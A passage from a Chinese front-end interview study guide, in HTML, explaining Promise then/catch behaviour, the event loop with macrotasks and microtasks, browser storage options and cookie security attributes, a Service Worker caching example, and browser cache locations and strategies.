p1<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 打印123</span>

<span class="token keyword">const</span> p2 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'then error'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// p2是rejected会触发后续catch回调</span>
p2<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">456</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">789</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// 打印789</span>
</code></pre></div><ul><li><code>catch</code>正常返回<code>fulfilled</code>，里面有报错返回<code>rejected</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> p1 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'my error'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'catch error'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
p1<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// console.log(p1) p1返回fulfilled 触发then回调</span>
<span class="token keyword">const</span> p2 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'my error'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'catch error'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// console.log(p2) p2返回rejected 触发catch回调</span>
p2<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div></li></ul> <p><strong>promise then和catch的链接</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 第一题</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// 状态返回fulfilled</span>
<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// catch中没有报错，状态返回fulfilled，后面的then会执行</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 1,3</span>
<span class="token comment">// 整个执行完没有报错，状态返回fulfilled</span>

<span class="token comment">// 第二题</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span> <span class="token comment">// then中有报错 状态返回rejected,后面的catch会执行</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// catch中没有报错，状态返回fulfilled，后面的then会执行</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 1,2,3</span>
<span class="token comment">// 整个执行完没有报错，状态返回fulfilled</span>

<span class="token comment">// 第三题</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span><span class="token comment">//then中有报错 状态返回rejected，后面的catch会执行</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// catch中没有报错，状态返回fulfilled，后面的catch不会执行</span>
<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 1，2</span>
<span class="token comment">// 整个执行完没有报错，状态返回fulfilled</span>
</code></pre></div><h3 id="event-loop执行机制过程"><a href="#event-loop执行机制过程" class="header-anchor">#</a> Event Loop执行机制过程</h3> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/4fdc86445fa2367b.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/0c93d362749fe612.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/facd54cb3df73dd0.png" loading="lazy" class="lazy"></p> <ul><li>同步代码一行行放到<code>Call Stack</code>执行，执行完就出栈</li> <li>遇到异步优先记录下，等待时机（定时、网络请求）</li> <li>时机到了就移动到<code>Call Queue</code>(宏任务队列)
<ul><li>如果遇到微任务（如<code>promise.then</code>）放到微任务队列</li> <li>宏任务队列和微任务队列是分开存放的
<ul><li>因为微任务是<code>ES6</code>语法规定的</li> <li>宏任务(<code>setTimeout</code>)是浏览器规定的</li></ul></li></ul></li> <li>如果<code>Call Stack</code>为空，即同步代码执行完，<code>Event Loop</code>开始工作
<ul><li><code>Call Stack</code>为空，尝试先<code>DOM</code>渲染，在触发下一次<code>Event Loop</code></li></ul></li> <li>轮询查找<code>Event Loop</code>，如有则移动到<code>Call Stack</code></li> <li>然后继续重复以上过程（类似永动机）</li></ul> <p><strong>DOM事件和Event Loop</strong></p> <blockquote><p><code>DOM</code>事件会放到<code>Web API中</code>等待用户点击，放到<code>Call Queue</code>，在移动到<code>Call Stack</code>执行</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/181bf0446f68007f.png" loading="lazy" class="lazy"></p> <ul><li><code>JS</code>是单线程的，异步(<code>setTimeout</code>、<code>Ajax</code>)使用回调，基于<code>Event Loop</code></li> <li><code>DOM</code>事件也使用回调，<code>DOM</code>事件非异步，但也是基于<code>Event Loop</code>实现</li></ul> <p><strong>宏任务和微任务</strong></p> <ul><li><strong>介绍</strong> <ul><li>宏任务：<code>setTimeout</code> 、<code>setInterval</code> 、<code>DOM</code>事件、<code>Ajax</code></li> <li>微任务：<code>Promise.then</code>、<code>async/await</code></li> <li>微任务比宏任务执行的更早</li></ul> <div class="language-js extra-class"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
<span class="token comment">// 100 400 300 200</span>
</code></pre></div></li> <li><strong>event loop 和 DOM 渲染</strong> <ul><li>每次<code>call stack</code>清空（每次轮询结束），即同步代码执行完。都是<code>DOM</code>重新渲染的机会，<code>DOM</code>结构如有改变重新渲染</li> <li>再次触发下一次<code>Event Loop</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> $p1 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;p&gt;一段文字&lt;/p&gt;'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> $p2 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;p&gt;一段文字&lt;/p&gt;'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> $p3 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;p&gt;一段文字&lt;/p&gt;'</span><span class="token punctuation">)</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#container'</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$p1<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$p2<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$p3<span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length'</span><span class="token punctuation">,</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">children</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token punctuation">)</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'本次 call stack 结束，DOM 结构已更新，但尚未触发渲染'</span><span class="token punctuation">)</span>
<span class="token comment">// （alert 会阻断 js 执行，也会阻断 DOM 渲染，便于查看效果）</span>
<span class="token comment">// 到此，即本次 call stack 结束后（同步任务都执行完了），浏览器会自动触发渲染，不用代码干预</span>

<span class="token comment">// 另外，按照 event loop 触发 DOM 渲染时机，setTimeout 时 alert ，就能看到 DOM 渲染后的结果了</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'setTimeout 是在下一次 Call Stack ，就能看到 DOM 渲染出来的结果了'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div></li> <li><strong>宏任务和微任务的区别</strong> <ul><li>宏任务：<code>DOM</code> 渲染后再触发，如<code>setTimeout</code></li> <li>微任务：<code>DOM</code> 渲染前会触发，如<code>Promise</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 修改 DOM</span>
<span class="token keyword">const</span> $p1 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;p&gt;一段文字&lt;/p&gt;'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> $p2 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;p&gt;一段文字&lt;/p&gt;'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> $p3 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;p&gt;一段文字&lt;/p&gt;'</span><span class="token punctuation">)</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#container'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$p1<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$p2<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$p3<span class="token punctuation">)</span>

<span class="token comment">// 微任务：渲染之前执行（DOM 结构已更新，看不到元素还没渲染）</span>
<span class="token comment">// Promise.resolve().then(() =&gt; {</span>
<span class="token comment">//     const length = $('#container').children().length</span>
<span class="token comment">//     alert(`micro task ${length}`) // DOM渲染了？No</span>
<span class="token comment">// })</span>

<span class="token comment">// 宏任务：渲染之后执行（DOM 结构已更新，可以看到元素已经渲染）</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> length <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">children</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">macro task </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>length<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token comment">// DOM渲染了？Yes</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div></li></ul> <blockquote><p>再深入思考一下：为何两者会有以上区别，一个在渲染前，一个在渲染后？</p></blockquote> <ul><li><strong>微任务</strong>：<code>ES</code> 语法标准之内，<code>JS</code> 引擎来统一处理。即，不用浏览器有任何干预，即可一次性处理完，更快更及时。</li> <li><strong>宏任务</strong>：<code>ES</code> 语法没有，<code>JS</code> 引擎不处理，浏览器（或 <code>nodejs</code>）干预处理。</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/facd54cb3df73dd0.png" loading="lazy" class="lazy"></p> <h2 id="_3-浏览器"><a href="#_3-浏览器" class="header-anchor">#</a> 3 浏览器</h2> <h3 id="储存"><a href="#储存" class="header-anchor">#</a> 储存</h3> <blockquote><p>涉及面试题：有几种方式可以实现存储功能，分别有什么优缺点？什么是 <code>Service Worker</code>？</p></blockquote> <p><strong>cookie，localStorage，sessionStorage，indexDB</strong></p> <table><thead><tr><th>特性</th> <th>cookie</th> <th>localStorage</th> <th>sessionStorage</th> <th>indexDB</th></tr></thead> <tbody><tr><td>数据生命周期</td> <td>一般由服务器生成，可以设置过期时间</td> <td>除非被清理，否则一直存在</td> <td>页面关闭就清理</td> <td>除非被清理，否则一直存在</td></tr> <tr><td>数据存储大小</td> <td><code>4KB</code></td> <td><code>5M</code></td> <td><code>5M</code></td> <td>无限</td></tr> <tr><td>与服务端通信</td> <td>每次都会携带在 <code>header</code> 中，对于请求性能影响</td> <td>不参与</td> <td>不参与</td> <td>不参与</td></tr></tbody></table> <blockquote><p>从上表可以看到，<code>cookie</code> 已经不建议用于存储。如果没有大量数据存储需求的话，可以使用 <code>localStorage</code> 和 <code>sessionStorage</code> 。对于不怎么改变的数据尽量使用 <code>localStorage</code> 存储，否则可以用 <code>sessionStorage</code>存储</p></blockquote> <p><strong>对于 cookie 来说，我们还需要注意安全性。</strong></p> <table><thead><tr><th>属性</th> <th>作用</th></tr></thead> <tbody><tr><td><code>value</code></td> <td>如果用于保存用户登录态，应该将该值加密，不能使用明文的用户标识</td></tr> <tr><td><code>http-only</code></td> <td>不能通过 <code>JS</code> 访问 <code>Cookie</code>，减少 <code>XSS</code> 攻击</td></tr> <tr><td><code>secure</code></td> <td>只能在协议为 <code>HTTPS</code> 的请求中携带</td></tr> <tr><td><code>same-site</code></td> <td>规定浏览器不能在跨域请求中携带 <code>Cookie</code>，减少 <code>CSRF</code> 攻击</td></tr></tbody></table> <p><strong>Service Worker</strong></p> <ul><li><code>Service Worker</code> 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。使用 <code>Service Worker</code>的话，传输协议必须为 <code>HTTPS</code>。因为 <code>Service Worker</code> 中涉及到请求拦截，所以必须使用 <code>HTTPS</code> 协议来保障安全</li> <li><code>Service Worker</code> 实现缓存功能一般分为三个步骤：首先需要先注册 <code>Service Worker</code>，然后监听到 <code>install</code> 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。以下是这个步骤的实现：</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// index.js</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>serviceWorker<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  navigator<span class="token punctuation">.</span>serviceWorker
    <span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'sw.js'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">registration</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'service worker 注册成功'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'servcie worker 注册失败'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token comment">// sw.js</span>
<span class="token comment">// 监听 `install` 事件，回调中缓存所需文件</span>
self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'install'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  e<span class="token punctuation">.</span><span class="token function">waitUntil</span><span class="token punctuation">(</span>
    caches<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'my-cache'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">cache</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> cache<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./index.html'</span><span class="token punctuation">,</span> <span class="token string">'./index.js'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// 拦截所有请求事件</span>
<span class="token comment">// 如果缓存中已经有请求的数据就直接用缓存，否则去请求数据</span>
self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  e<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span>
    caches<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> response
      <span class="token punctuation">}</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fetch source'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><blockquote><p>打开页面，可以在开发者工具中的 <code>Application</code> 看到 <code>Service Worker</code> 已经启动了</p></blockquote> <blockquote><p>在 <code>Cache</code> 中也可以发现我们所需的文件已被缓存</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/gitee/2020/07/fe/6.png" loading="lazy" class="lazy"></p> <blockquote><p>当我们重新刷新页面可以发现我们缓存的数据是从 <code>Service Worker</code> 中读取的</p></blockquote> <h3 id="浏览器缓存机制"><a href="#浏览器缓存机制" class="header-anchor">#</a> 浏览器缓存机制</h3> <blockquote><p>注意：该知识点属于性能优化领域，并且整一章节都是一个面试题</p></blockquote> <ul><li>缓存可以说是性能优化中简单高效的一种优化方式了，它可以显著减少网络传输所带来的损耗。</li> <li>对于一个数据请求来说，可以分为发起网络请求、后端处理、浏览器响应三个步骤。浏览器缓存可以帮助我们在第一和第三步骤中优化性能。比如说直接使用缓存而不发起请求，或者发起了请求但后端存储的数据和前端一致，那么就没有必要再将数据回传回来，这样就减少了响应数据。</li></ul> <blockquote><p>接下来的内容中我们将通过以下几个部分来探讨浏览器缓存机制：</p></blockquote> <ul><li>缓存位置</li> <li>缓存策略</li> <li>实际场景应用缓存策略</li></ul> <p><strong>1. 缓存位置</strong></p> <blockquote><p>从缓存位置上来说分为四种，并且各自有优先级，当依次查找缓存且都没有命中的时候，才会去请求网络</p></blockquote> <ol><li><code>Service Worker</code></li> <li><code>Memory Cache</code></li> <li><code>Disk Cache</code></li> <li><code>Push Cache</code></li> <li>网络请求</li></ol> <p><strong>1.1 Service Worker</strong></p> <ul><li><code>service Worker</code> 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。</li> <li>当 <code>Service Worker</code> 没有命中缓存的时候，我们需要去调用 <code>fetch</code> 函数获取数据。也就是说，如果我们没有在 <code>Service Worker</code> 命中缓存的话，会根据缓存查找优先级去查找数据。但是不管我们是从 <code>Memory Cache</code> 中还是从网络请求中获取的数据，浏览器都会显示我们是从 <code>Service Worker</code> 中获取的内容。</li></ul> <p><strong>1.2 Memory Cache</strong></p> <ul><li><code>Memory Cache</code> 也就是内存中的缓存，读取内存中的数据肯定比磁盘快。但是内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放。 一旦我们关闭 <code>Tab</code> 页面，内存中的缓存也就被释放了。</li> <li>当我们访问过页面以后，再次刷新页面，可以发现很多数据都来自于内存缓存</li></ul> <p><img alt="" data-src="https://s.poetries.work/gitee/2020/07/fe/7.png" loading="lazy" class="lazy"></p> <blockquote><p>那么既然内存缓存这么高效，我们是不是能让数据都存放在内存中呢？</p></blockquote> <ul><li>先说结论，这是不可能的。首先计算机中的内存一定比硬盘容量小得多，操作系统需要精打细算内存的使用，所以能让我们使用的内存必然不多。内存中其实可以存储大部分的文件，比如说 <code>JS</code>、<code>HTML</code>、<code>CSS</code>、图片等等</li> <li>当然，我通过一些实践和猜测也得出了一些结论：</li> <li>对于大文件来说，大概率是不存储在内存中的，反之优先当前系统内存使用率高的话，文件优先存储进硬盘</li></ul> <p><strong>1.3 Disk Cache</strong></p> <ul><li><code>Disk Cache</code> 也就是存储在硬盘中的缓存，读取速度慢点，但是什么都能存储到磁盘中，比之 <code>Memory Cache</code> 胜在容量和存储时效性上。</li> <li>在所有浏览器缓存中，<code>Disk Cache</code> 覆盖面基本是最大的。它会根据 <code>HTTP Herder</code> 中的字段判断哪些资源需要缓存，哪些资源可以不请求直接使用，哪些资源已经过期需要重新请求。并且即使在跨站点的情况下，相同地址的资源一旦被硬盘缓存下来，就不会再次去请求数据</li></ul> <p><strong>1.4 Push Cache</strong></p> <ul><li><code>Push Cache</code> 是 <code>HTTP/2</code> 中的内容，当以上三种缓存都没有命中时，它才会被使用。并且缓存时间也很短暂，只在会话（<code>Session</code>）中存在，一旦会话结束就被释放。</li> <li><code>Push Cache</code> 在国内能够查到的资料很少，也是因为 <code>HTTP/2</code> 在国内不够普及，但是 <code>HTTP/2</code> 将会是日后的一个趋势</li></ul> <blockquote><p>结论</p></blockquote> <ul><li>所有的资源都能被推送，但是 <code>Edge</code> 和 <code>Safari</code> 浏览器兼容性不怎么好</li> <li>可以推送 <code>no-cache</code> 和 <code>no-store</code> 的资源</li> <li>一旦连接被关闭，<code>Push Cache</code> 就被释放</li> <li>多个页面可以使用相同的 <code>HTTP/2</code> 连接，也就是说能使用同样的缓存</li> <li><code>Push Cache</code> 中的缓存只能被使用一次</li> <li>浏览器可以拒绝接受已经存在的资源推送</li> <li>你可以给其他域名推送资源</li></ul> <p><strong>1.5 网络请求</strong></p> <ul><li>如果所有缓存都没有命中的话，那么只能发起请求来获取资源了。</li> <li>那么为了性能上的考虑，大部分的接口都应该选择好缓存策略，接下来我们就来学习缓存策略这部分的内容</li></ul> <p><strong>2 缓存策略</strong></p> <blockquote><p>通常浏览器缓存策略分为两种：强缓存和协商缓存，并且缓存策略都是通过设置 <code>HTTP Header</code> 来实现的</p></blockquote> <p><strong>2.1 强缓存</strong></p> <blockquote><p>强缓存可以通过设置两种 <code>HTTP Header</code> 实现：<code>Expires</code> 和 <code>Cache-Control</code> 。强缓存表示在缓存期间不需要请求，<code>state code</code> 为 <code>200</code></p></blockquote> <p><strong>Expires</strong></p> <div class="language- extra-class"><pre class="language-text"><code>Expires: Wed, 22 Oct 2018 08:41:00 GMT
</code></pre></div><blockquote><p><code>Expires</code> 是 <code>HTTP/1</code> 的产物，表示资源会在 <code>Wed, 22 Oct 2018 08:41:00 GMT</code> 后过期，需要再次请求。并且 <code>Expires</code> 受限于本地时间，如果修改了本地时间，可能会造成缓存失效。</p></blockquote> <p><strong>Cache-control</strong></p> <div class="language- extra-class"><pre class="language-text"><code>Cache-control: max-age=30
